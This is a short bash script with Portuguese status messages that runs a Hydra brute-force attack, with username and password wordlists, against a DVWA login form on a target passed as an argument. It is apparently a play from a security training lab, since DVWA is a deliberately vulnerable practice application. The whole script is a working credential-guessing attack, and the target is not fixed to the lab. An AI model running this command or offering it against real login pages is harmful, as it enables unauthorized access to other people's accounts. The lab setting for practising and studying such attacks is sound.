#!/bin/bash

TARGET=$1

echo "[INFO] Iniciando ataque de força bruta com Hydra..."
sleep 1
hydra -L plays/play-02-hydra-dvwa/users.txt -P plays/play-02-hydra-dvwa/passwords.txt "$TARGET" http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed" -V -t 4
echo "[SUCESSO] Ataque concluído."
